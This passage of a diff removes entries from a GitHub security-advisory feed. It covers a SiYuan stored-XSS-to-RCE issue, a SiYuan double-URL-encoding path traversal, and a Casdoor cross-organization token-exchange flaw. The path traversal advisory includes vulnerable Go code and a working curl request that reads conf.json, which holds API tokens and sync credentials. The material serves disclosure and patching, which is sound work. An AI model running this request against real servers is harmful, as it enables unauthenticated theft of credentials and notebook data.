-<p>Stored XSS to RCE on Electron desktop builds, plus XSS on mobile and Docker web builds.</p>
-<p>The payload fires whenever the renderer refreshes snippets: on boot, on manual reload, or on a <code>reloadSnippet</code> WebSocket push. No user click required beyond having the app open.</p>
-<p>Anyone affected by a workspace-write compromise is exposed. Realistic paths in: compromised SiYuan Cloud / S3 / WebDAV sync credentials, a workspace folder mounted on a shared filesystem (Dropbox, Syncthing, network share, git), or a multi-user Docker server where any authenticated user can call <code>/api/snippet/setSnippet</code>. Once the malicious snippet is in the workspace, every peer that syncs and has <code>enabledCSS:true</code> runs the payload.</p>
-<p>The bug also silently bypasses the user's snippet-toggle intent. Someone who turned <code>enabledJS</code> off and left <code>enabledCSS</code> on was making a deliberate decision not to run untrusted JavaScript. The CSS path runs it anyway.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mvjr-vv3c-w4qv">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mvjr-vv3c-w4qv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54067">https://nvd.nist.gov/vuln/detail/CVE-2026-54067</a></li>
-<li><a href="https://github.com/advisories/GHSA-mvjr-vv3c-w4qv">https://github.com/advisories/GHSA-mvjr-vv3c-w4qv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mvjr-vv3c-w4qv</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-10T19:25:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Path Traversal via Double URL Encoding in /assets/*path (publish mode arbitrary   file─read), Incomplete fix of CVE-2026-41894 ]]></title>
-        <id>https://github.com/advisories/GHSA-p4m3-mgmm-c664</id>
-        <link href="https://github.com/advisories/GHSA-p4m3-mgmm-c664"/>
-        <updated>2026-07-10T19:25:04.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>  The patch for CVE-2026-41894 ("Path Traversal via Double URL Encoding") sanitized the <code>/export/</code> route but the
-  <strong>identical root cause remains in the <code>/assets/*path</code> route</strong>. In publish mode (anonymous read-only HTTP endpoint,
-  default port 6808), an unauthenticated remote attacker can read arbitrary files inside <code>WorkspaceDir</code> — including
-  <code>conf/conf.json</code> (which contains the <code>AccessAuthCode</code> SHA256 hash, API token, and sync keys), <code>temp/siyuan.db</code>,
-  <code>temp/blocktree.db</code>, and <code>siyuan.log</code> — by double-URL-encoding <code>..</code> segments.</p>
-<p>  Verified against siyuan v3.6.5:</p>
-<ul>
-<li><code>GET /assets/%252e%252e/%252e%252e/conf/conf.json</code> → <strong>HTTP 200, 10349 bytes (conf.json served)</strong></li>
-<li><code>GET /export/%252e%252e/%252e%252e/conf/conf.json</code> → HTTP 401 (patched)</li>
-<li><code>GET /assets/%2e%2e/conf/conf.json</code> → HTTP 404 (single-decode handled correctly)</li>
-</ul>
-<h2 id="vulnerable-code">Vulnerable Code</h2>
-<p>  <strong>Step 1 — route &amp; first decode</strong> (<code>kernel/server/serve.go:587-626</code>):
-  The router registers <code>GET /assets/*path</code> for the publish listener. Gin performs one URL decoding pass on <code>URL.Path</code>,
-  so a request for <code>/assets/%252e%252e/...</code> yields <code>context.Param("path") == "/%2e%2e/%2e%2e/conf/conf.json"</code> — literal
-  <code>%2e%2e</code> strings, which <code>path.Clean</code> cannot collapse.</p>
-<p>  <strong>Step 2 — second decode via fallback</strong> (<code>kernel/model/assets.go:536-563</code>, <code>GetAssetAbsPath</code>):</p>
-<pre><code class="language-go">p, err := getAssetAbsPath(relativePath)
-if nil != err {
-    // fallback
-    decoded, e := url.PathUnescape(relativePath)   // ← line 548, second decode
-    if nil == e {
-        p, err = getAssetAbsPath(decoded)
-    }
-}
-</code></pre>
-<p>  After the fallback decodes <code>%2e%2e</code> to <code>..</code>, <code>filepath.Join(DataDir, "../../conf/conf.json")</code> is <code>Clean</code>-ed to
-  <code>WorkspaceDir/conf/conf.json</code>, an existing file.</p>
-<p>  <strong>Step 3 — publish-mode access gate fall-through</strong> (<code>kernel/model/publish_access.go:288</code>,
-  <code>CheckAbsPathAccessableByPublishAccess</code>):</p>
-<pre><code class="language-go">if !filelock.IsSubPath(util.DataDir, absPath) {
-    return true   // ← fall-through allows anything outside DataDir but inside WorkspaceDir
-}
-</code></pre>
-<p>  Because the resolved file is <em>outside</em> <code>DataDir</code> (it's in <code>WorkspaceDir</code>), the gate returns <code>true</code> and
-  <code>IsSensitivePath()</code> is never invoked — <code>.db</code> / <code>.log</code> / <code>conf/</code> denylists do not apply to the <code>/assets/</code> route at all
-  (unlike the patched <code>/export/</code> route, which additionally checks <code>IsSubPath(exportBaseDir, ...)</code>).</p>
-<p>  <strong>Step 4 — file served</strong> (<code>http.ServeFile</code>): the request <code>URL.Path</code> contains literal <code>%2e%2e</code>, not <code>..</code>, so Go's
-  <code>containsDotDot</code> guard passes and the file is sent.</p>
-<h2 id="poc">PoC</h2>
-<p>  Preconditions: siyuan kernel running with publish mode enabled (<code>conf.publish.enable = true</code>). Publish mode is the
-  documented anonymous read-only endpoint for sharing notebooks.</p>
-<pre><code>$ curl -i "http://victim:6808/assets/%252e%252e/%252e%252e/conf/conf.json"
-HTTP/1.1 200 OK
-Content-Length: 10349
-Content-Type: application/json
-...
-{"appearance":{...},"editor":{...},"system":{...},"accessAuthCode":"&lt;sha256&gt;","api":{"token":"&lt;api token&gt;"}, ...}
-</code></pre>
-<p>  Compared with the patched route:</p>
-<pre><code>$ curl -i "http://victim:6808/export/%252e%252e/%252e%252e/conf/conf.json"
-HTTP/1.1 401 Unauthorized
-</code></pre>
-<h2 id="root-cause">Root Cause</h2>
-<p>  Three independent flaws combine:</p>
-<ol>
-<li><code>GetAssetAbsPath</code> performs a second <code>url.PathUnescape</code> as a "compatibility" fallback, re-introducing the
-  double-decode primitive that the CVE-2026-41894 patch eliminated on <code>/export/</code>.</li>
-<li><code>CheckAbsPathAccessableByPublishAccess</code> returns <code>true</code> for any path outside <code>DataDir</code>, even when that path is still
-   inside <code>WorkspaceDir</code> (which contains <code>conf/conf.json</code>, <code>temp/*.db</code>, <code>siyuan.log</code>).</li>
-<li>The <code>IsSensitivePath()</code> denylist applied to <code>/export/</code> is not called from the <code>/assets/</code> handler.</li>
-</ol>
-<h2 id="impact">Impact</h2>
-<p>  Unauthenticated remote arbitrary file read inside <code>WorkspaceDir</code>. Confirmed-readable files include:</p>
-<ul>
-<li><code>conf/conf.json</code> — <code>accessAuthCode</code> SHA256 (offline crackable), API token, S3/WebDAV sync credentials.</li>
-<li><code>temp/siyuan.db</code>, <code>temp/blocktree.db</code>, <code>temp/asset_content.db</code> — full notebook content (SQLite).</li>
-<li><code>siyuan.log</code> — internal paths, OS username, plugin info.</li>
-</ul>
-<p>  Compromise of <code>accessAuthCode</code> / API token escalates to authenticated kernel API access (full read/write of all
-  notebooks). Compromise of sync credentials escalates beyond the host.</p>
-<h2 id="fix">Fix</h2>
-<ol>
-<li>Remove the <code>url.PathUnescape</code> fallback in <code>GetAssetAbsPath</code> (assets.go:548), matching the <code>/export/</code> patch.</li>
-<li>In <code>CheckAbsPathAccessableByPublishAccess</code>, replace the <code>IsSubPath(DataDir, ...)</code> fall-through with an explicit
-  allowlist (only <code>DataDir</code> and its publishable subtree) and <strong>always</strong> call <code>IsSensitivePath()</code>.</li>
-<li>Apply <code>IsSensitivePath()</code> inside the <code>/assets/*path</code> handler in <code>serve.go</code> as defense-in-depth.</li>
-</ol>
-<h2 id="status">Status</h2>
-<p>  Privately reported via GitHub Security Advisory. PoC reproduced locally against v3.6.5 (publish port 6808): <code>GET   /assets/%252e%252e/%252e%252e/conf/conf.json</code> returned HTTP 200 / 10349 bytes.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4m3-mgmm-c664">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4m3-mgmm-c664</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54066">https://nvd.nist.gov/vuln/detail/CVE-2026-54066</a></li>
-<li><a href="https://github.com/advisories/GHSA-p4m3-mgmm-c664">https://github.com/advisories/GHSA-p4m3-mgmm-c664</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p4m3-mgmm-c664</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-10T19:25:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor: GetTokenExchangeToken bypass through lack of cross-organization JWT signature check]]></title>
-        <id>https://github.com/advisories/GHSA-c9w5-qp6m-m395</id>
-        <link href="https://github.com/advisories/GHSA-c9w5-qp6m-m395"/>
-        <updated>2026-07-09T23:32:37.000Z</updated>
-        <content type="html"><![CDATA[<p>Casdoor versions 2.362.0 and earlier contain a vulnerability enabling cross-organization token exchange. The GetTokenExchangeToken function in object/token_oauth.go validates JWT signatures but does not verify that the token's user belongs to the same organization as the target application. This can result in privilege escalation across organizational boundaries.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9094">https://nvd.nist.gov/vuln/detail/CVE-2026-9094</a></li>
-<li><a href="https://kb.cert.org/vuls/id/780781">https://kb.cert.org/vuls/id/780781</a></li>
-<li><a href="https://github.com/casdoor/casdoor/commit/d92b8568686d">https://github.com/casdoor/casdoor/commit/d92b8568686d</a></li>
-<li><a href="https://github.com/advisories/GHSA-c9w5-qp6m-m395">https://github.com/advisories/GHSA-c9w5-qp6m-m395</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c9w5-qp6m-m395</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-28T18:30:32.000Z</published>
     </entry>
 </feed>
